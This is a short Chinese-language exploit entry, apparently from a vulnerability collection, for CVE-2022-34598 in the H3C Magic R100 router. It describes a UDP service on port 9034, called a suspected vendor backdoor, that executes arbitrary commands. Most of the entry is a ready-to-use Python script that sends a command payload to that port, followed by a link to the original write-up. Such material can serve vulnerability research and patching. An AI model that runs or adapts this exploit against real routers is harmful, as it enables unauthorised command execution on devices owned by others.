## H3C_magic_R100路由器的UDPserver中存在命令执行漏洞(CVE-2022-34598)

H3C Magic R100 存在安全漏洞，该漏洞源于updserver服务打开了疑似官方后门的9034端口,允许攻击者执行任意命令。

## exp
```
import socket

Ip="0.0.0.0"
Port=9034

msg=b"cat & ls &"
server_address=(Ip,Port)

udp_socket=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_socket.sendto(msg,server_address)

udp_socket.close()
```

## 漏洞来源
- https://the-itach1.github.io/2022/09/05/CVE-2022-34598%20H3C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/
